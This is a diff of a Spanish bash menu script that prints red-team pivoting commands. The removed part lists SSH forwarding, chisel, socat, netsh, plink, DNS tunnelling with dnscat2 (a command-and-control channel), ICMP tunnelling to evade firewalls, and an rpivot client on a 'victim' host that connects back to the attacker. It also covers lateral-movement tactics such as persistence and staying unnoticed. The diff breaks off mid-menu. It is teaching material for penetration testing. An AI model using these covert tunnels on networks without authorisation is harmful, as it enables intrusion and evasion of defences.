@@ -1,662 +1,610 @@
 #!/bin/bash
 
-# =============================================================================
-# Script: pivoting.sh
-# Descripción: Herramienta para implementación de port forwarding y pivoting
-# Autor: Oliver
-# Fecha: 2025
-# =============================================================================
-
-# Colores para el menú
+# Colores para la interfaz
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-BLUE='\033[0;34m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
 NC='\033[0m' # No Color
 
-# =============================================================================
-# Funciones de utilidad
-# =============================================================================
+# Configuración global
+JUMP_HOST="192.168.1.100"
+TARGET_NETWORK="192.168.2.0/24"
+LOCAL_PORT="1080"
+REMOTE_PORT="3389"
+SOCKS_PORT="1080"
 
-# Función para mostrar mensajes de error
-show_error() {
-    echo -e "${RED}Error: $1${NC}"
-}
 
-# Función para mostrar mensajes de éxito
-show_success() {
-    echo -e "${GREEN}Éxito: $1${NC}"
-}
 
-# Función para mostrar mensajes informativos
-show_info() {
-    echo -e "${BLUE}Info: $1${NC}"
-}
 
-# Función para mostrar mensajes de advertencia
-show_warning() {
-    echo -e "${YELLOW}Advertencia: $1${NC}"
-}
 
-# Función para limpiar la pantalla
-clear_screen() {
+# Función para mostrar el banner
+show_banner() {
     clear
+    echo -e "${BLUE}"
+    echo "===================================================================================="
+    echo "|                 NETWORK PIVOTING & DISCOVERY TOOLKIT                             |"
+    echo "|                 Técnicas Avanzadas de Red Team                                   |"
+    echo "===================================================================================="
+    echo ""
+    echo "Descripción:# Network Pivoting & Discovery"
+    echo "Guía completa de técnicas de pivoting y descubrimiento de redes"
+    echo "Autor: Oliver - github: "
+    echo "Fecha: 2025"
+    echo "==============================================================================="
+  
+    echo -e "${NC}"
+    echo -e "${YELLOW}Jump Host:${NC} $JUMP_HOST"
+    echo -e "${YELLOW}Target Network:${NC} $TARGET_NETWORK"
+    echo -e "${YELLOW}SOCKS Port:${NC} $SOCKS_PORT"
+    echo "===================================================================================="
+    echo -e "${RED}NOTA: Esta es una guía informativa. Los comandos se muestran pero no se ejecutan.${NC}"
+    echo "===================================================================================="
+    echo
 }
 
-# Función para esperar entrada del usuario
-wait_for_enter() {
-    read -p "Presione Enter para continuar..."
+# Función para pausa y continuar
+press_enter() {
+    echo
+    echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
+    read
 }
 
-# =============================================================================
-# Funciones de menú
-# =============================================================================
-
-# Función para mostrar el menú principal
-show_menu() {
-    clear_screen
-    echo -e "${BLUE}=== HelpMemory - Port Forwarding y Pivoting ===${NC}"
-    echo -e "${YELLOW}Seleccione una opción:${NC}"
-    echo -e "${GREEN}1.${NC} Port Forwarding"
-    echo -e "${GREEN}2.${NC} Pivoting"
-    echo -e "${GREEN}3.${NC} Salir"
+# Función para mostrar comandos
+show_command() {
+    local command=$1
+    local description=$2
+    
+    echo -e "${GREEN}Descripción:${NC} $description"
+    echo -e "${CYAN}Comando:${NC}"
+    echo -e "${YELLOW}$command${NC}"
     echo
-    echo -n "Seleccione una opción: "
 }
 
-# Función para mostrar el menú de Port Forwarding
-show_port_forwarding_menu() {
-    clear_screen
-    echo -e "${BLUE}=== Port Forwarding ===${NC}"
-    echo -e "${YELLOW}Seleccione el método:${NC}"
-    echo -e "${GREEN}1.${NC} SSH Local Forwarding (-L)"
-    echo -e "${GREEN}2.${NC} SSH Remote Forwarding (-R)"
-    echo -e "${GREEN}3.${NC} SSH Dynamic Forwarding (-D)"
-    echo -e "${GREEN}4.${NC} Socat Forwarding"
-    echo -e "${GREEN}5.${NC} Chisel Forwarding"
-    echo -e "${GREEN}6.${NC} Plink Forwarding"
-    echo -e "${GREEN}7.${NC} Windows Netsh Forwarding"
-    echo -e "${GREEN}8.${NC} DNS Tunneling (Dnscat2)"
-    echo -e "${GREEN}9.${NC} ICMP Tunneling (ptunnel-ng)"
-    echo -e "${GREEN}10.${NC} SocksOverRDP"
-    echo -e "${GREEN}11.${NC} Volver al menú principal"
-    echo
-    echo -n "Seleccione una opción: "
-}
-
-# Función para mostrar el menú de Pivoting
-show_pivoting_menu() {
-    clear_screen
-    echo -e "${BLUE}=== Pivoting ===${NC}"
-    echo -e "${YELLOW}Seleccione el método:${NC}"
-    echo -e "${GREEN}1.${NC} SSHuttle"
-    echo -e "${GREEN}2.${NC} Proxychains"
-    echo -e "${GREEN}3.${NC} Metasploit Autoroute"
-    echo -e "${GREEN}4.${NC} rpivot"
-    echo -e "${GREEN}5.${NC} Gigolo"
-    echo -e "${GREEN}6.${NC} Metodologías de Pivoting en Escenarios Reales"
-    echo -e "${GREEN}7.${NC} Volver al menú principal"
-    echo
-    echo -n "Seleccione una opción: "
-}
-
-# =============================================================================
-# Funciones de implementación
-# =============================================================================
-
-# Función para implementar SSH Local Forwarding
-implement_ssh_local_forwarding() {
-    echo -e "${BLUE}=== SSH Local Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es SSH Local Forwarding?${NC}"
-    echo "Permite redirigir un puerto local a un puerto remoto a través de SSH."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Forwarding simple:"
-    echo "ssh -L 8080:localhost:80 usuario@servidor"
-    echo
-    echo "2. Forwarding a otro host:"
-    echo "ssh -L 8080:host_remoto:80 usuario@servidor"
-    echo
-    echo "3. Forwarding con puerto específico:"
-    echo "ssh -L 8080:localhost:80 -p 2222 usuario@servidor"
-    echo
-    echo "4. Múltiples forwardings:"
-    echo "ssh -L 8080:localhost:80 -L 8443:localhost:443 usuario@servidor"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. El puerto local debe estar disponible"
-    echo "2. Se requiere acceso SSH al servidor"
-    echo "3. El tráfico está encriptado"
-    echo "4. Útil para acceder a servicios internos"
-}
-
-# Función para implementar SSH Remote Forwarding
-implement_ssh_remote_forwarding() {
-    echo -e "${BLUE}=== SSH Remote Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es SSH Remote Forwarding?${NC}"
-    echo "Permite redirigir un puerto remoto a un puerto local a través de SSH."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Forwarding simple:"
-    echo "ssh -R 8080:localhost:80 usuario@servidor"
-    echo
-    echo "2. Forwarding a otro host:"
-    echo "ssh -R 8080:host_local:80 usuario@servidor"
-    echo
-    echo "3. Forwarding con puerto específico:"
-    echo "ssh -R 8080:localhost:80 -p 2222 usuario@servidor"
-    echo
-    echo "4. Múltiples forwardings:"
-    echo "ssh -R 8080:localhost:80 -R 8443:localhost:443 usuario@servidor"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. El puerto remoto debe estar disponible"
-    echo "2. Se requiere acceso SSH al servidor"
-    echo "3. El tráfico está encriptado"
-    echo "4. Útil para exponer servicios locales"
-}
-
-# Función para implementar SSH Dynamic Forwarding
-implement_ssh_dynamic_forwarding() {
-    echo -e "${BLUE}=== SSH Dynamic Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es SSH Dynamic Forwarding?${NC}"
-    echo "Crea un proxy SOCKS local que enruta todo el tráfico a través de SSH."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Forwarding dinámico simple:"
-    echo "ssh -D 9050 usuario@servidor"
-    echo
-    echo "2. Forwarding con puerto específico:"
-    echo "ssh -D 9050 -p 2222 usuario@servidor"
-    echo
-    echo "3. Configuración de proxychains:"
-    echo "socks4 127.0.0.1 9050"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Crea un proxy SOCKS local"
-    echo "2. Se requiere acceso SSH al servidor"
-    echo "3. El tráfico está encriptado"
-    echo "4. Útil para enrutar todo el tráfico"
-}
-
-# Función para implementar Chisel Forwarding
-implement_chisel_forwarding() {
-    echo -e "${BLUE}=== Chisel Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es Chisel?${NC}"
-    echo "Herramienta de túnel TCP/UDP sobre HTTP con encriptación SSH."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Iniciar servidor:"
-    echo "./chisel server -p 8080 --reverse"
-    echo
-    echo "2. Cliente local forwarding:"
-    echo "./chisel client SERVER_IP:8080 R:8080:localhost:80"
-    echo
-    echo "3. Cliente remote forwarding:"
-    echo "./chisel client SERVER_IP:8080 8080:localhost:80"
-    echo
-    echo "4. Cliente dynamic forwarding:"
-    echo "./chisel client SERVER_IP:8080 socks"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere permisos de ejecución"
-    echo "2. Soporta múltiples tipos de forwarding"
-    echo "3. El tráfico está encriptado"
-    echo "4. Útil para evadir firewalls"
-}
-
-# Función para implementar Socat Forwarding
-implement_socat_forwarding() {
-    echo -e "${BLUE}=== Socat Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es Socat?${NC}"
-    echo "Herramienta multipropósito para establecer conexiones bidireccionales."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Local forwarding:"
-    echo "socat TCP-LISTEN:8080,fork TCP:localhost:80"
-    echo
-    echo "2. Remote forwarding:"
-    echo "socat TCP-LISTEN:8080,fork TCP:REMOTE_IP:80"
-    echo
-    echo "3. UDP forwarding:"
-    echo "socat UDP-LISTEN:53,fork UDP:REMOTE_IP:53"
-    echo
-    echo "4. SSL forwarding:"
-    echo "socat OPENSSL-LISTEN:443,cert=server.pem TCP:localhost:80"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Soporta múltiples protocolos"
-    echo "2. Puede encriptar el tráfico"
-    echo "3. Útil para debugging"
-    echo "4. Flexible y potente"
-}
-
-# Función para implementar SocksOverRDP
-implement_socks_over_rdp() {
-    echo -e "${BLUE}=== SocksOverRDP ===${NC}"
-    echo -e "${YELLOW}¿Qué es SocksOverRDP?${NC}"
-    echo "Crea un túnel SOCKS a través de una conexión RDP."
-    echo
-
-    echo -e "${GREEN}Configuración:${NC}"
-    echo "1. Registrar plugin:"
-    echo "regsvr32.exe SocksOverRDP-Plugin.dll"
-    echo
-    echo "2. Iniciar servidor:"
-    echo "SocksOverRDP-Server.exe"
-    echo
-    echo "3. Configurar Proxifier:"
-    echo "SOCKS5 127.0.0.1 1080"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere Windows"
-    echo "2. Necesita permisos de administrador"
-    echo "3. Útil para pivoting en redes Windows"
-    echo "4. Integración con RDP"
-}
-
-# Función para implementar SSHuttle
-implement_sshuttle() {
-    echo -e "${BLUE}=== SSHuttle ===${NC}"
-    echo -e "${YELLOW}¿Qué es SSHuttle?${NC}"
-    echo "Crea un túnel SSH que simula una VPN."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Túnel básico:"
-    echo "sshuttle -r usuario@servidor 192.168.1.0/24"
-    echo
-    echo "2. Túnel con puerto específico:"
-    echo "sshuttle -r usuario@servidor:2222 192.168.1.0/24"
-    echo
-    echo "3. Túnel con detección automática:"
-    echo "sshuttle -r usuario@servidor -N"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere Python"
-    echo "2. Necesita permisos de root"
-    echo "3. Enruta todo el tráfico"
-    echo "4. No requiere configuración en el servidor"
-}
-
-# Función para implementar Proxychains
-implement_proxychains() {
-    echo -e "${BLUE}=== Proxychains ===${NC}"
-    echo -e "${YELLOW}¿Qué es Proxychains?${NC}"
-    echo "Herramienta para forzar aplicaciones a usar proxies."
-    echo
-
-    echo -e "${GREEN}Configuración:${NC}"
-    echo "1. Editar /etc/proxychains.conf:"
-    echo "socks4 127.0.0.1 9050"
-    echo
-    echo "2. Uso básico:"
-    echo "proxychains nmap -sT -p- 192.168.1.1"
-    echo
-    echo "3. Uso con otras herramientas:"
-    echo "proxychains curl http://192.168.1.1"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Soporta múltiples tipos de proxy"
-    echo "2. Útil para enrutar herramientas"
-    echo "3. Fácil de configurar"
-    echo "4. Compatible con muchas aplicaciones"
-}
-
-# Función para implementar Metasploit Autoroute
-implement_metasploit_autoroute() {
-    echo -e "${BLUE}=== Metasploit Autoroute ===${NC}"
-    echo -e "${YELLOW}¿Qué es Metasploit Autoroute?${NC}"
-    echo "Módulo de Metasploit para enrutar tráfico a través de sesiones."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Agregar ruta:"
-    echo "route add 192.168.1.0/24 1"
-    echo
-    echo "2. Ver rutas:"
-    echo "route print"
-    echo
-    echo "3. Eliminar ruta:"
-    echo "route del 192.168.1.0/24"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere sesión de Metasploit"
-    echo "2. Útil para pivoting en pentesting"
-    echo "3. Integración con otros módulos"
-    echo "4. Automatización de rutas"
-}
-
-# Función para implementar Plink Forwarding
-implement_plink() {
-    echo -e "${BLUE}=== Plink Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es Plink?${NC}"
-    echo "Plink (PuTTY Link) es una versión de línea de comandos de PuTTY que permite"
-    echo "crear túneles SSH de manera eficiente. Es especialmente útil en sistemas"
-    echo "Windows para establecer conexiones seguras y túneles."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Local Forwarding:"
-    echo "plink -L 8080:localhost:80 usuario@servidor"
-    echo
-    echo "2. Remote Forwarding:"
-    echo "plink -R 8080:localhost:80 usuario@servidor"
-    echo
-    echo "3. Dynamic Forwarding:"
-    echo "plink -D 9050 usuario@servidor"
-    echo
-    echo "4. Usando archivo de clave:"
-    echo "plink -i ruta/a/clave.ppk -L 8080:localhost:80 usuario@servidor"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere PuTTY instalado"
-    echo "2. Útil en sistemas Windows"
-    echo "3. Soporta autenticación por clave"
-    echo "4. Compatible con todos los tipos de forwarding"
-}
-
-# Función para implementar Windows Netsh Forwarding
-implement_netsh() {
-    echo -e "${BLUE}=== Windows Netsh Forwarding ===${NC}"
-    echo -e "${YELLOW}¿Qué es Netsh?${NC}"
-    echo "Netsh (Network Shell) es una herramienta de línea de comandos de Windows"
-    echo "que permite configurar y monitorear dispositivos de red en Windows."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. IPv4 a IPv4:"
-    echo "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25"
-    echo
-    echo "2. IPv4 a IPv6:"
-    echo "netsh interface portproxy add v4tov6 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=2001:db8::1"
-    echo
-    echo "3. Ver reglas actuales:"
-    echo "netsh interface portproxy show all"
-    echo
-    echo "4. Eliminar regla:"
-    echo "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere Windows 7 o superior"
-    echo "2. Necesita permisos de administrador"
-    echo "3. Soporta IPv4 e IPv6"
-    echo "4. Útil para reenvío de puertos en Windows"
-}
-
-# Función para implementar DNS Tunneling con Dnscat2
-implement_dnscat2() {
-    echo -e "${BLUE}=== DNS Tunneling con Dnscat2 ===${NC}"
-    echo -e "${YELLOW}¿Qué es Dnscat2?${NC}"
-    echo "Dnscat2 es una herramienta de tunelización que utiliza el protocolo DNS para"
-    echo "enviar datos entre dos hosts. Utiliza un canal cifrado de Comando y Control (C&C)"
-    echo "y envía datos dentro de registros TXT dentro del protocolo DNS."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Iniciar servidor:"
-    echo "ruby dnscat2.rb --dns host=IP_DNS,port=53,domain=dominio.com --no-cache"
-    echo
-    echo "2. Cliente Windows (PowerShell):"
-    echo "Import-Module .\dnscat2.ps1"
-    echo "Start-Dnscat2 -DNSserver IP_DNS -Domain dominio.com -PreSharedSecret CLAVE"
-    echo
-    echo "3. Cliente Linux:"
-    echo "./dnscat2 dominio.com"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere Ruby y Bundler"
-    echo "2. Necesita acceso a un servidor DNS"
-    echo "3. Útil para evadir firewalls"
-    echo "4. El tráfico está encriptado"
-}
-
-# Función para implementar ICMP Tunneling con ptunnel-ng
-implement_ptunnel() {
-    echo -e "${BLUE}=== ICMP Tunneling con ptunnel-ng ===${NC}"
-    echo -e "${YELLOW}¿Qué es ptunnel-ng?${NC}"
-    echo "ptunnel-ng es una herramienta que permite crear túneles ICMP, encapsulando"
-    echo "tráfico dentro de paquetes ICMP (ping). Es especialmente útil para evadir"
-    echo "firewalls que permiten tráfico ICMP pero bloquean otros protocolos."
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. Iniciar servidor:"
-    echo "sudo ./ptunnel-ng -rIP_DESTINO -R3389"
-    echo
-    echo "2. Iniciar cliente:"
-    echo "sudo ./ptunnel-ng -pIP_SERVIDOR -l3388 -rIP_DESTINO -R3389"
-    echo
-    echo "3. Verificar conexión:"
-    echo "telnet 127.0.0.1 3388"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere permisos de administrador"
-    echo "2. El firewall debe permitir ICMP"
-    echo "3. Útil para evadir firewalls"
-    echo "4. Encapsula tráfico TCP en ICMP"
-}
-
-# Función para implementar Pivoting con rpivot
-implement_pivoting() {
-    echo -e "${BLUE}=== Pivoting con rpivot ===${NC}"
-    echo -e "${YELLOW}¿Qué es rpivot?${NC}"
-    echo "rpivot es una herramienta especializada para realizar pivoting de manera"
-    echo "eficiente y segura. Permite crear túneles SSH inversos a través de hosts"
-    echo "comprometidos, facilitando el acceso a redes internas."
-    echo
-
-    echo -e "${GREEN}Arquitectura:${NC}"
-    echo "1. Servidor (Máquina Atacante):"
-    echo "   - Escucha conexiones entrantes"
-    echo "   - Gestiona las conexiones de pivoting"
-    echo "   - Debe ser accesible desde la víctima"
-    echo
-    echo "2. Cliente (Máquina Víctima):"
-    echo "   - Inicia la conexión al servidor"
-    echo "   - Actúa como punto de pivote"
-    echo "   - Debe tener Python instalado"
-    echo
-
-    echo -e "${GREEN}Comandos básicos:${NC}"
-    echo "1. En la máquina atacante (servidor):"
-    echo "   python server.py --server-port 9999 --server-ip 0.0.0.0"
-    echo "   # 0.0.0.0 permite conexiones desde cualquier IP"
-    echo
-    echo "2. En la máquina víctima (cliente):"
-    echo "   python client.py --server-ip IP_ATACANTE --server-port 9999"
-    echo "   # IP_ATACANTE es la IP de tu máquina atacante"
-    echo
-    echo "3. Configurar proxychains en la máquina atacante:"
-    echo "   # Editar /etc/proxychains.conf"
-    echo "   socks4 127.0.0.1 1080"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere Python en ambas máquinas"
-    echo "2. El servidor debe ser accesible desde la víctima"
-    echo "3. Útil para pivoting en redes"
-    echo "4. Soporta múltiples conexiones"
-    echo "5. El tráfico está encriptado"
-    echo
-    echo -e "${YELLOW}Consideraciones de seguridad:${NC}"
-    echo "1. Asegúrate de que el puerto del servidor esté abierto"
-    echo "2. Considera usar un puerto no estándar"
-    echo "3. Verifica que la conexión sea estable"
-    echo "4. Monitorea el tráfico de red"
-}
-
-# Función para implementar Gigolo
-implement_gigolo() {
-    echo -e "${BLUE}=== Gigolo ===${NC}"
-    echo -e "${YELLOW}¿Qué es Gigolo?${NC}"
-    echo "Gigolo es una herramienta gráfica para gestionar conexiones remotas"
-    echo "y túneles SSH. Permite crear y gestionar conexiones de manera"
-    echo "intuitiva a través de una interfaz gráfica."
-    echo
-
-    echo -e "${GREEN}Características principales:${NC}"
-    echo "1. Interfaz gráfica intuitiva"
-    echo "2. Gestión de conexiones SSH"
-    echo "3. Soporte para túneles locales y remotos"
-    echo "4. Gestión de claves SSH"
-    echo
-
-    echo -e "${GREEN}Uso básico:${NC}"
-    echo "1. Instalación:"
-    echo "sudo apt-get install gigolo"
-    echo
-    echo "2. Configuración de conexión:"
-    echo "- Abrir Gigolo"
-    echo "- Click en 'Conectar'"
-    echo "- Seleccionar 'SSH'"
-    echo "- Configurar host, usuario y puerto"
-    echo
-    echo "3. Configuración de túnel:"
-    echo "- Seleccionar 'Túnel'"
-    echo "- Configurar puerto local y remoto"
-    echo "- Activar 'Reenviar puerto'"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Requiere entorno gráfico"
-    echo "2. Ideal para usuarios que prefieren GUI"
-    echo "3. Soporta múltiples conexiones"
-    echo "4. Útil para gestión de túneles SSH"
-}
-
-# Función para implementar Metodologías de Pivoting en Escenarios Reales
-implement_real_world_pivoting() {
-    echo -e "${BLUE}=== Metodologías de Pivoting en Escenarios Reales ===${NC}"
-    echo -e "${YELLOW}¿Qué son las metodologías de pivoting?${NC}"
-    echo "Son técnicas y estrategias utilizadas para moverse lateralmente"
-    echo "a través de una red comprometida, permitiendo acceder a sistemas"
-    echo "que no son directamente accesibles desde el exterior."
-    echo
-
-    echo -e "${GREEN}Metodologías comunes:${NC}"
-    echo "1. Pivoting de Capa 2:"
-    echo "   - ARP Spoofing"
-    echo "   - MAC Flooding"
-    echo "   - VLAN Hopping"
-    echo
-    echo "2. Pivoting de Capa 3:"
-    echo "   - IP Forwarding"
-    echo "   - Túneles SSH"
-    echo "   - VPNs"
-    echo
-    echo "3. Pivoting de Capa 7:"
-    echo "   - Proxies"
-    echo "   - Túneles DNS"
-    echo "   - Túneles HTTP/HTTPS"
-    echo
-
-    echo -e "${GREEN}Escenarios comunes:${NC}"
-    echo "1. Red DMZ:"
-    echo "   - Comprometer servidor web"
-    echo "   - Establecer túnel SSH"
-    echo "   - Acceder a red interna"
-    echo
-    echo "2. Red Corporativa:"
-    echo "   - Comprometer estación de trabajo"
-    echo "   - Elevar privilegios"
-    echo "   - Moverse a servidores"
-    echo
-    echo "3. Red Cloud:"
-    echo "   - Comprometer instancia"
-    echo "   - Acceder a metadatos"
-    echo "   - Moverse entre regiones"
-    echo
-
-    echo -e "${YELLOW}Consideraciones importantes:${NC}"
-    echo "1. Mantener bajo perfil"
-    echo "2. Documentar rutas"
-    echo "3. Mantener persistencia"
-    echo "4. Considerar impacto"
-}
-
-# =============================================================================
-# Bucle principal
-# =============================================================================
-
-main() {
+# Función principal
+main_menu() {
     while true; do
-        show_menu
-        read -r option
-
+        show_banner
+        echo -e "${GREEN}Menú Principal - Pivoting & Discovery:${NC}"
+        echo "1. Técnicas de Pivoting"
+        echo "2. Herramientas de Discovery"
+        echo "3. SSH Tunneling"
+        echo "4. Metasploit Pivoting"
+        echo "5. Herramientas Avanzadas"
+        echo "6. Configuración de Entorno"
+        echo "0. Salir"
+        echo
+        read -p "Selecciona una opción [0-6]: " option
+        
         case $option in
-            1)
-                while true; do
-                    show_port_forwarding_menu
-                    read -r pf_option
-
-                    case $pf_option in
-                        1) implement_ssh_local_forwarding ;;
-                        2) implement_ssh_remote_forwarding ;;
-                        3) implement_ssh_dynamic_forwarding ;;
-                        4) implement_socat_forwarding ;;
-                        5) implement_chisel_forwarding ;;
-                        6) implement_plink ;;
-                        7) implement_netsh ;;
-                        8) implement_dnscat2 ;;
-                        9) implement_ptunnel ;;
-                        10) implement_socks_over_rdp ;;
-                        11) break ;;
-                        *) show_error "Opción inválida" ;;
-                    esac
-
-                    wait_for_enter
-                done
-                ;;
-            2)
-                while true; do
-                    show_pivoting_menu
-                    read -r pivoting_option
-
-                    case $pivoting_option in
-                        1) implement_sshuttle ;;
-                        2) implement_proxychains ;;
-                        3) implement_metasploit_autoroute ;;
-                        4) implement_pivoting ;;
-                        5) implement_gigolo ;;
-                        6) implement_real_world_pivoting ;;
-                        7) break ;;
-                        *) show_error "Opción inválida" ;;
-                    esac
-
-                    wait_for_enter
-                done
-                ;;
-            3)
-                show_success "Saliendo..."
-                exit 0
-                ;;
-            *)
-                show_error "Opción inválida"
-                ;;
+            1) pivoting_menu ;;
+            2) discovery_menu ;;
+            3) ssh_tunneling_menu ;;
+            4) metasploit_pivoting_menu ;;
+            5) advanced_tools_menu ;;
+            6) config_menu ;;
+            0) exit 0 ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
         esac
-
-        wait_for_enter
     done
 }
 
-# Ejecutar el programa principal
-main
+# ==============================================
+# MENÚS ESPECÍFICOS
+# ==============================================
+
+# Menú de Técnicas de Pivoting
+pivoting_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Técnicas de Pivoting:${NC}"
+        echo "1. SSH Tunneling (Básico)"
+        echo "2. Port Forwarding (Windows)"
+        echo "3. SOCKS Proxies"
+        echo "4. VPN Pivoting"
+        echo "5. DNS Tunneling"
+        echo "6. ICMP Tunneling"
+        echo "7. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-7]: " option
+        
+        case $option in
+            1) ssh_basic_info ;;
+            2) windows_pf_info ;;
+            3) socks_proxies_info ;;
+            4) vpn_pivoting_info ;;
+            5) dns_tunneling_info ;;
+            6) icmp_tunneling_info ;;
+            7) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Herramientas de Discovery
+discovery_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Herramientas de Discovery:${NC}"
+        echo "1. Nmap Escaneo Avanzado"
+        echo "2. Masscan - Escaneo Rápido"
+        echo "3. Netdiscover - ARP Discovery"
+        echo "4. Responder - LLMNR/NBT-NS"
+        echo "5. Bettercap - Análisis Completo"
+        echo "6. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-6]: " option
+        
+        case $option in
+            1) nmap_advanced_info ;;
+            2) masscan_info ;;
+            3) netdiscover_info ;;
+            4) responder_info ;;
+            5) bettercap_info ;;
+            6) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de SSH Tunneling
+ssh_tunneling_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}SSH Tunneling Avanzado:${NC}"
+        echo "1. Local Port Forwarding"
+        echo "2. Remote Port Forwarding"
+        echo "3. Dynamic Port Forwarding (SOCKS)"
+        echo "4. SSH Multiplexing"
+        echo "5. SSH Config Avanzado"
+        echo "6. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-6]: " option
+        
+        case $option in
+            1) ssh_local_pf_info ;;
+            2) ssh_remote_pf_info ;;
+            3) ssh_dynamic_pf_info ;;
+            4) ssh_multiplexing_info ;;
+            5) ssh_config_info ;;
+            6) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Metasploit Pivoting
+metasploit_pivoting_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Metasploit Pivoting:${NC}"
+        echo "1. Meterpreter Port Forwarding"
+        echo "2. Autoroute y SOCKS"
+        echo "3. Pivoting Completo"
+        echo "4. Reverse Pivoting"
+        echo "5. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-5]: " option
+        
+        case $option in
+            1) metasploit_pf_info ;;
+            2) metasploit_socks_info ;;
+            3) metasploit_full_pivot_info ;;
+            4) metasploit_reverse_info ;;
+            5) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Herramientas Avanzadas
+advanced_tools_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Herramientas Avanzadas:${NC}"
+        echo "1. Chisel - TCP/UDP Tunneling"
+        echo "2. Rpivot - SOCKS Proxy"
+        echo "3. reGeorg - Web Tunneling"
+        echo "4. sshuttle - VPN-like Proxy"
+        echo "5. Plink (Windows SSH)"
+        echo "6. Proxychains Config"
+        echo "7. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-7]: " option
+        
+        case $option in
+            1) chisel_info ;;
+            2) rpivot_info ;;
+            3) regeorg_info ;;
+            4) sshuttle_info ;;
+            5) plink_info ;;
+            6) proxychains_config_info ;;
+            7) break ;;
+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
+        esac
+    done
+}
+
+# Menú de Configuración
+config_menu() {
+    while true; do
+        show_banner
+        echo -e "${GREEN}Configuración de Entorno:${NC}"
+        echo "1. Configurar Jump Host"
+        echo "2. Configurar Target Network"
+        echo "3. Configurar Puerto Local"
+        echo "4. Configurar Puerto Remoto"
+        echo "5. Configurar Puerto SOCKS"
+        echo "6. Volver al Menú Principal"
+        echo
+        read -p "Selecciona una opción [1-6]: " option
+        
+        case $option in
+            1) read -p "Nuevo Jump Host: " JUMP_HOST; echo -e "${GREEN}Jump Host configurado a: $JUMP_HOST${NC}"; sleep 2 ;;
+            2) read -p "Nueva Target Network: " TARGET_NETWORK; echo -e "${GREEN}Target Network configurado a: $TARGET_NETWORK${NC}"; sleep 2 ;;
+            3) read -p "Nuevo Puerto Local: " LOCAL_PORT; echo -e "${GREEN}Puerto Local configurado a: $LOCAL_PORT${NC}"; sleep 2 ;;
+            4) read -p "Nuevo Puerto Remoto: " REMOTE_PORT; echo -e "${GREEN}Puerto Remoto configurado a: $REMOTE_PORT${NC}"; sleep 2 ;;
+            5) read -p "Nuevo Puerto SOCKS: " SOCKS_PORT; echo -e "${GREEN}Puerto SOCKS configurado a: $SOCKS_PORT${NC}"; sleep 2 ;;
+            6) break ;;
